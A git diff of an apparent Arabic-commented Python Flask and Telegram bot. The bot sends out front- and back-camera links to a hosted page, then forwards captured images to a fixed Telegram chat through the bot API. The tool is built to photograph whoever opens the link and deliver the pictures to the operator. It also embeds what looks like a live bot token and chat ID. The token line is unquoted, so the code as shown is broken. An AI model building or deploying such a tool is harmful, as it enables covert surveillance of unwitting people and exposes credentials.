@@ -1,18 +1,19 @@
 import os
 import asyncio
-from flask import Flask, request, jsonify, render_template_string
-import requests
+import threading
 import base64
+import requests
+from flask import Flask, request, jsonify, render_template_string
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, ContextTypes
-import threading
 
+# إعداد Flask
 app = Flask(__name__)
 
-# بياناتك الخاصة
+# بياناتك (تأكد إنها صحيحة)
 BOT_TOKEN = 8664732759:AAEjhYPpopZn_QDY2udIAbO1v33JQeDlsmE
 CHAT_ID = "6691718718"
-WEB_URL = "https://shado-bot.onrender.com" 
+WEB_URL = "https://shado-bot.onrender.com"
 
 HTML_PAGE = """
 <!DOCTYPE html>
@@ -71,9 +72,9 @@ def index(): return render_template_string(HTML_PAGE)
 def upload():
     data = request.json.get('image')
     if data:
-        img_data = data.split(",")[1]
+        img_data = base64.b64decode(data.split(",")[1])
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
-        requests.post(url, data={'chat_id': CHAT_ID}, files={'photo': ('shot.jpg', base64.b64decode(img_data))})
+        requests.post(url, data={'chat_id': CHAT_ID}, files={'photo': ('shot.jpg', img_data)})
     return jsonify({"status": "ok"})
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -81,21 +82,22 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         [InlineKeyboardButton("📸 كاميرا أمامية", url=f"{WEB_URL}?mode=user")],
         [InlineKeyboardButton("📷 كاميرا خلفية", url=f"{WEB_URL}?mode=environment")]
     ]
-    await update.message.reply_text("اختر الرابط:", reply_markup=InlineKeyboardMarkup(keyboard))
+    await update.message.reply_text("يا هلا بشادو، اختر الكاميرا عشان تبدأ:", reply_markup=InlineKeyboardMarkup(keyboard))
 
-def main():
-    # تشغيل البوت بطريقة متوافقة مع Render
+async def run_bot():
     application = Application.builder().token(BOT_TOKEN).build()
     application.add_handler(CommandHandler("start", start))
-    
-    # تشغيل Flask في Thread منفصل
-    def run_flask():
-        app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
-    
-    threading.Thread(target=run_flask, daemon=True).start()
-    
-    # تشغيل البوت
-    application.run_polling(close_loop=False)
+    await application.initialize()
+    await application.start_polling()
+    # الحفاظ على تشغيل البوت
+    while True:
+        await asyncio.sleep(3600)
+
+def start_flask():
+    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
 
 if __name__ == '__main__':
-    main()
+    # تشغيل Flask في Thread منفصل
+    threading.Thread(target=start_flask, daemon=True).start()
+    # تشغيل البوت في الـ Main Loop
+    asyncio.run(run_bot())
